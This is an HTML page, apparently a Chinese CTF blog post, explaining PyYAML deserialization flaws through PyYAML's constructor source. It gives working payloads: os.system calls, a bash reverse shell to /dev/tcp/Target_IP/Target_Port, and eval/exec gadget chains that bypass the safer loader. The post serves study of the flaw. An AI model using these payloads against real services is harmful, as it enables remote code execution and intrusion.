@@ -1,0 +1,546 @@
+
+<!DOCTYPE html>
+<html lang="zh_CN">
+<head>
+    <meta charset="utf-8" />
+    <title>PY-YAML反序列化 | Tremseの部屋</title>
+    <meta name="author" content="Tremse" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>TREMSEの部屋</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;TREMSEの部屋</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>PY-YAML反序列化</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/12/25
+        </span>
+        
+        <span class="category">
+            <a href="/categories/CTF/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                CTF
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/Web/" style="color: #ff7d73">
+                    Web
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/Py/" style="color: #03a9f4">
+                    Py
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        
+        <h2 id="什么是yaml"><a href="#什么是yaml" class="headerlink" title="什么是yaml?"></a>什么是yaml?</h2><p>&emsp;&emsp;YAML是一种人类可读的数据序列化格式，经常用于配置文件和数据交换。它的设计目标是易于阅读和编写，并且能够被不同编程语言支持的解析器解析。<br>&emsp;&emsp;在学习yaml反序列化漏洞之前，肯定要先学学它的基本语法，这里就不过多赘述了，可以看<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_50367873/article/details/134009615">这个教程</a><br>&emsp;&emsp;这里要重点注意一下类型转换这部分。漏洞利用用的到的一些yaml和python类型转换如下</p>
+<table blockindex="29">
+    <thead>
+        <tr>
+            <th>YAML</th>
+            <th>Python</th>
+        </tr>
+    </thead>
+    <tbody>
+        <tr>
+            <td>!!python/name:module.name</td>
+            <td>尝试创建module.name这个Python对象</td>
+        </tr>
+        <tr>
+            <td>!!python/module:package.module</td>
+            <td>尝试导入package.module这个模块</td>
+        </tr>
+        <tr>
+            <td>!!python/object:module.cls</td>
+            <td>尝试创建module.cls这个类的实例</td>
+        </tr>
+        <tr>
+            <td>!!python/object/new:module.cls [args]</td>
+            <td>尝试创建module.cls的实例，并传入args的参数</td>
+        </tr>
+        <tr>
+            <td>!!python/object/apply:module.func [args]</td>
+            <td>尝试调用module.func，并传入args的参数</td>
+        </tr>
+    </tbody>
+</table>
+
+<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><h4 id="pythonx2fobjectx2fnew-和-pythonx2fobjectx2fapply的实现"><a href="#python-object-new-和-python-object-apply的实现" class="headerlink" title="!!python&#x2F;object&#x2F;new 和 !!python&#x2F;object&#x2F;apply的实现"></a>!!python&#x2F;object&#x2F;new 和 !!python&#x2F;object&#x2F;apply的实现</h4><p>&emsp;&emsp;在constructor.py(也就是默认加载器)中，我们可以找到相应的实现函数</p>
+<blockquote>
+<ul>
+<li>python&#x2F;object&#x2F;apply–&gt;construct_python_object_apply</li>
+</ul>
+</blockquote>
+<ul>
+<li>python&#x2F;object&#x2F;new–&gt;construct_python_object_new</li>
+</ul>
+<pre><code class="python">def construct_python_object_apply(self, suffix, node, newobj=False):
+        # Format:
+        #   !!python/object/apply       # (or !!python/object/new)
+        #   args: [ ... arguments ... ]
+        #   kwds: &#123; ... keywords ... &#125;
+        #   state: ... state ...
+        #   listitems: [ ... listitems ... ]
+        #   dictitems: &#123; ... dictitems ... &#125;
+        # or short format:
+        #   !!python/object/apply [ ... arguments ... ]
+        # The difference between !!python/object/apply and !!python/object/new
+        # is how an object is created, check make_python_instance for details.
+        if isinstance(node, SequenceNode):
+            # 如果节点为序列类型，则初始化参数、关键字、状态、列表和字典为空
+            args = self.construct_sequence(node, deep=True)
+            kwds = &#123;&#125;
+            state = &#123;&#125;
+            listitems = []
+            dictitems = &#123;&#125;
+        else:
+             # 如果节点为映射类型，则从值中提取参数、关键字、状态、列表和字典，其实就反应了该类标签所可以接受得参数类型。
+            value = self.construct_mapping(node, deep=True)
+            args = value.get(&#39;args&#39;, [])
+            kwds = value.get(&#39;kwds&#39;, &#123;&#125;)
+            state = value.get(&#39;state&#39;, &#123;&#125;)
+            listitems = value.get(&#39;listitems&#39;, [])
+            dictitems = value.get(&#39;dictitems&#39;, &#123;&#125;)
+        instance = self.make_python_instance(suffix, node, args, kwds, newobj)
+        #如果存在创建 Python 对象实例
+        if state:
+            self.set_python_instance_state(instance, state)
+        if listitems:
+            instance.extend(listitems)
+        if dictitems:
+            for key in dictitems:
+                instance[key] = dictitems[key]
+        return instance
+
+    def construct_python_object_new(self, suffix, node):
+        return self.construct_python_object_apply(suffix, node, newobj=True)
+        # 可以看到python/object/new和python/object/apply实质上差别并不大
+</code></pre>
+<p>&emsp;&emsp;发现make_python_instance这个函数，跟进一下</p>
+<pre><code class="python">def make_python_instance(self, suffix, node,
+            args=None, kwds=None, newobj=False):
+        if not args:
+            args = []
+        if not kwds:
+            kwds = &#123;&#125;
+        cls = self.find_python_name(suffix, node.start_mark)
+        if newobj and isinstance(cls, type):
+            return cls.__new__(cls, *args, **kwds)
+        else:
+            return cls(*args, **kwds)
+</code></pre>
+<p>&emsp;&emsp;接着还得看看find_python_name这个函数</p>
+<pre><code class="python">def find_python_name(self, name, mark):
+        if not name:
+            raise ConstructorError(&quot;while constructing a Python object&quot;, mark,
+                    &quot;expected non-empty name appended to the tag&quot;, mark)
+        if &#39;.&#39; in name:
+            module_name, object_name = name.rsplit(&#39;.&#39;, 1)
+        else:
+            module_name = &#39;builtins&#39;
+            object_name = name
+        try:
+            __import__(module_name)
+        except ImportError as exc:
+            raise ConstructorError(&quot;while constructing a Python object&quot;, mark,
+                    &quot;cannot find module %r (%s)&quot; % (module_name, exc), mark)
+        module = sys.modules[module_name]
+        if not hasattr(module, object_name):
+            raise ConstructorError(&quot;while constructing a Python object&quot;, mark,
+                    &quot;cannot find %r in the module %r&quot;
+                    % (object_name, module.__name__), mark)
+        return getattr(module, object_name)
+</code></pre>
+<p>&emsp;&emsp;总结一下，当我们执行<span style="background:#efefef;border: 0.01rem solid;border-radius: 2px;border-color:#dfdfdf;">yaml.load(‘!!python&#x2F;object&#x2F;apply:os.system [“whoami”]’)</span>这串代码时，是这么个流程:</p>
+<ul>
+<li>调用<strong>construct_python_object_apply</strong>函数</li>
+<li>随之调用<strong>make_python_instance</strong>函数</li>
+<li>随之调用<strong>find_python_name</strong>函数</li>
+<li>name存在并且有”.”，分开os和system，尝试导入os，将module设定为os，判定os是否存在system属性，存在，返回getattr(module, object_name)</li>
+<li>getattr(module, object_name)也就是os.system函数，由于是!!python&#x2F;object&#x2F;apply调用所以newobj&#x3D;Flase，则调用cls(*args, **kwds)，即os.system(“whoami”)</li>
+</ul>
+<h4 id="pythonx2fmodule的实现"><a href="#python-module的实现" class="headerlink" title="!!python&#x2F;module的实现"></a>!!python&#x2F;module的实现</h4><p>&emsp;&emsp;该标签对应的函数是construct_python_module</p>
+<pre><code class="python">def construct_python_module(self, suffix, node):
+        value = self.construct_scalar(node)
+        if value:
+            raise ConstructorError(&quot;while constructing a Python module&quot;, node.start_mark,
+                    &quot;expected the empty value, but found %r&quot; % value, node.start_mark)
+        return self.find_python_module(suffix, node.start_mark)
+</code></pre>
+<p>&emsp;&emsp;跟进find_python_module函数</p>
+<pre><code class="python">def find_python_module(self, name, mark):
+        if not name:
+            raise ConstructorError(&quot;while constructing a Python module&quot;, mark,
+                    &quot;expected non-empty name appended to the tag&quot;, mark)
+        try:
+            __import__(name)
+        except ImportError as exc:
+            raise ConstructorError(&quot;while constructing a Python module&quot;, mark,
+                    &quot;cannot find module %r (%s)&quot; % (name, exc), mark)
+        return sys.modules[name]
+</code></pre>
+<p>&emsp;&emsp;可以发现这里并没有可以执行指令的地方，只是导入了指定的模块。但也存在利用价值，放到后文讨论</p>
+<h4 id="pythonx2fname的实现"><a href="#python-name的实现" class="headerlink" title="!!python&#x2F;name的实现"></a>!!python&#x2F;name的实现</h4><p>&emsp;&emsp;该标签对应的函数时construct_python_name</p>
+<pre><code class="python">def construct_python_name(self, suffix, node):
+        value = self.construct_scalar(node)
+        if value:
+            raise ConstructorError(&quot;while constructing a Python name&quot;, node.start_mark,
+                    &quot;expected the empty value, but found %r&quot; % value, node.start_mark)
+        return self.find_python_name(suffix, node.start_mark)
+</code></pre>
+<p>&emsp;&emsp;可见其调用了find_python_name，这个函数之前已经解释过了。最终是返回了module中的name。</p>
+<h2 id="对于pyyaml模块版本lt51的漏洞利用手法"><a href="#对于PyYAML模块版本" class="headerlink" title="对于PyYAML模块版本&lt;5.1的漏洞利用手法"></a>对于PyYAML模块版本&lt;5.1的漏洞利用手法</h2><pre><code class="python">yaml.load(data,Loader=) #加载单个YAML配置
+yaml.load_all(data) # 加载多个YAML配置
+</code></pre>
+<p>&emsp;&emsp;这些版本的加载器默认为Constructor，并不安全。</p>
+<h4 id="pythonx2fobjectx2fnew-和-pythonx2fobjectx2fapply的利用"><a href="#python-object-new-和-python-object-apply的利用" class="headerlink" title="!!python&#x2F;object&#x2F;new 和 !!python&#x2F;object&#x2F;apply的利用"></a>!!python&#x2F;object&#x2F;new 和 !!python&#x2F;object&#x2F;apply的利用</h4><pre><code class="python">yaml.load(&quot;&quot;&quot;
+!!python/object/apply:os.system
+- whoami
+&quot;&quot;&quot;)
+# 这样就可以达到调用os.system执行whoami命令。
+yaml.load(&quot;&quot;&quot;
+!!python/object/apply:os.system
+- bash -c &quot;bash -i &gt;&amp; /dev/tcp/Target_IP/Target_Port 0&gt;&amp;1&quot;
+&quot;&quot;&quot;)
+# 这样就可以达到反弹shell的目的
+</code></pre>
+<h4 id="pythonx2fmodule的利用"><a href="#python-module的利用" class="headerlink" title="!!python&#x2F;module的利用"></a>!!python&#x2F;module的利用</h4><p>&emsp;&emsp;如果我们知道某个恶意python文件在服务器上的路径，或者能够上传这样的文件，那么我们就可以利用!!python&#x2F;module将它以module的形式导入到当前文件<br>&emsp;&emsp;例如:</p>
+<pre><code class="python"># exp.py
+import os
+os.system(&#39;whoami&#39;)
+</code></pre>
+<p>那么<span style="background:#efefef;border: 0.01rem solid;border-radius: 2px;border-color:#dfdfdf;">yaml.load(‘!!python&#x2F;module:upload.exp’)</span>这段语句就可以间接做到rce的作用。</p>
+<h4 id="pythonx2fname的利用"><a href="#python-name的利用" class="headerlink" title="!!python&#x2F;name的利用"></a>!!python&#x2F;name的利用</h4><p>&emsp;&emsp;首先给出一个例子:</p>
+<pre><code class="python">import yaml
+key= &quot;114514&quot;
+b= yaml.load(&#39;!!python/name:__main__.key&#39; )
+if b == key:
+    print(&quot;ikun&quot;)
+else:
+    print(&quot;you are not ikun&quot;)
+</code></pre>
+<p>&emsp;&emsp;我们可以这样来绕过条件判断。当key未知或者不可预测时，也可以这样过条件判断。当然利用方法不止这些，应用总是灵活的。</p>
+<h2 id="对于pyyaml模块版本gtx3d51的漏洞利用手法"><a href="#对于PyYAML模块版本-5-1的漏洞利用手法" class="headerlink" title="对于PyYAML模块版本&gt;&#x3D;5.1的漏洞利用手法"></a>对于PyYAML模块版本&gt;&#x3D;5.1的漏洞利用手法</h2><p>&emsp;&emsp;在PyYaml&gt;&#x3D;5.1的版本中,find_python_name方法添加了unsafe&#x3D;False导致我们不能直接通过__import__来引入模块。并且在PyYAML&gt;&#x3D;5.1版本中,将默认加载器调整为FullConstructor，加载的模块必须位于sys.modules中(说明程序已经 import 过了才让加载)才能够加载成功。<br>&emsp;&emsp;如果没有对于加载器选择的过滤，可以直接变更加载器，然后和之前的操作一样:</p>
+<pre><code class="python">yaml.unsafe_load(paylaod)
+yaml.load(payload,Loader=UnsafeLoader)
+</code></pre>
+<p>&emsp;&emsp;当然这基本没有可能性，所以还是另寻出路吧。<br>&emsp;&emsp;Fullconstructor中的find_python_name函数:</p>
+<pre><code class="python">def find_python_name(self, name, mark, unsafe=False):
+        if not name:
+            raise ConstructorError(&quot;while constructing a Python object&quot;, mark,
+                    &quot;expected non-empty name appended to the tag&quot;, mark)
+        if &#39;.&#39; in name:
+            module_name, object_name = name.rsplit(&#39;.&#39;, 1)
+        else:
+            module_name = &#39;builtins&#39;
+            object_name = name
+        if unsafe:
+            try:
+                __import__(module_name)
+            except ImportError as exc:
+                raise ConstructorError(&quot;while constructing a Python object&quot;, mark,
+                        &quot;cannot find module %r (%s)&quot; % (module_name, exc), mark)
+        if module_name not in sys.modules:
+            raise ConstructorError(&quot;while constructing a Python object&quot;, mark,
+                    &quot;module %r is not imported&quot; % module_name, mark)
+        module = sys.modules[module_name]
+        if not hasattr(module, object_name):
+            raise ConstructorError(&quot;while constructing a Python object&quot;, mark,
+                    &quot;cannot find %r in the module %r&quot;
+                    % (object_name, module.__name__), mark)
+        return getattr(module, object_name)
+</code></pre>
+<p>&emsp;&emsp;我们可以发现在unsafe为false的时候是无法导入新的模块的，但是我们可以利用builtins进行一些操作<br>&emsp;&emsp;例子:</p>
+<pre><code class="python">yaml.load(&quot;&quot;&quot;
+!!python/object/new:tuple
+- !!python/object/new:map
+  - !!python/name:eval
+  - [&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;] 
+&quot;&quot;&quot;)
+</code></pre>
+<p>&emsp;&emsp;创建一个tuple对象，在这之中创建一个map对象，map的参数就是之后的<span style="background:#efefef;border: 0.01rem solid;border-radius: 2px;border-color:#dfdfdf;">!!python&#x2F;name:eval</span>和<span style="background:#efefef;border: 0.01rem solid;border-radius: 2px;border-color:#dfdfdf;">[“<strong>import</strong>(‘os’).system(‘whoami’)”]</span><br>&emsp;&emsp;这里使用tuple也是有其意义的，但是在这里解释有些冗长，详见文末参考~</p>
+<h4 id="更高级的利用方法"><a href="#更高级的利用方法" class="headerlink" title="更高级的利用方法"></a>更高级的利用方法</h4><p>&emsp;&emsp;在construct_python_object_apply这个函数中，我们可以看到</p>
+<pre><code class="python">if listitems:
+   nstance.extend(listitems)
+</code></pre>
+<p>&emsp;&emsp;我们可以新建一个type对象，将它的extend属性令为”!!python&#x2F;name:exec”,再在加上一个listitems,就可以执行listitems中的命令了</p>
+<pre><code class="python">payload = &#39;&#39;&#39;
+!!python/object/new:type
+args:
+  - exp
+  - !!python/tuple []
+  - &#123;&quot;extend&quot;: !!python/name:exec &#125;
+listitems: &quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;
+&#39;&#39;&#39;
+yaml.load(payload)
+</code></pre>
+<p>&emsp;&emsp;利用state也可以做到一种攻击，首先看看set_python_instance_state函数</p>
+<pre><code class="python">def set_python_instance_state(self, instance, state, unsafe=False):
+        if hasattr(instance, &#39;__setstate__&#39;):
+            instance.__setstate__(state)
+        else:
+            slotstate = &#123;&#125;
+            if isinstance(state, tuple) and len(state) == 2:
+                state, slotstate = state
+            if hasattr(instance, &#39;__dict__&#39;):
+                if not unsafe and state:
+                    for key in state.keys():
+                        self.check_state_key(key)
+                instance.__dict__.update(state)
+            elif state:
+                slotstate.update(state)
+            for key, value in slotstate.items():
+                if not unsafe:
+                    self.check_state_key(key)
+                setattr(instance, key, value)
+</code></pre>
+<p>&emsp;&emsp;下面给出一个用例:</p>
+<pre><code class="python">payload = &quot;&quot;&quot;
+- !!python/object/new:str
+    args: []
+    state: !!python/tuple
+    - &quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;
+    - !!python/object/new:staticmethod
+      args: [0]
+      state:
+        update: !!python/name:exec
+&quot;&quot;&quot;
+yaml.load(payload)
+</code></pre>
+<p>&emsp;&emsp;攻击流程如下:</p>
+<ul>
+<li>创建str对象并且不给参数，这主要是个套子的作用，是为了设定其state为!!python&#x2F;tuple</li>
+<li>观察set_python_instance_state函数，<pre><code class="python">if isinstance(state, tuple) and len(state) == 2:
+                state, slotstate = state
+</code></pre>
+  在现在的情况下，state就是<pre><code>&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;
+</code></pre>
+  而slotstate就是<pre><code>!!python/object/new:staticmethod
+  args: [0]
+  state:
+    update: !!python/name:exec
+</code></pre>
+</li>
+<li>slotstate经过处理后，其update属性就成为了exec</li>
+<li>再执行slotstate.update(state)，其实就是exec(state)</li>
+</ul>
+<blockquote>
+<p>参考 &#x1F970;:<br>    - <a target="_blank" rel="noopener" href="https://forum.butian.net/share/2288">PyYaml反序列化漏洞</a><br>    - <a target="_blank" rel="noopener" href="https://github.com/yaml/pyyaml/blob/main/lib/yaml/constructor.py">PyYaml源码</a></p>
+</blockquote>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+
+</div>
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 Tremseの部屋
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;Tremse
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
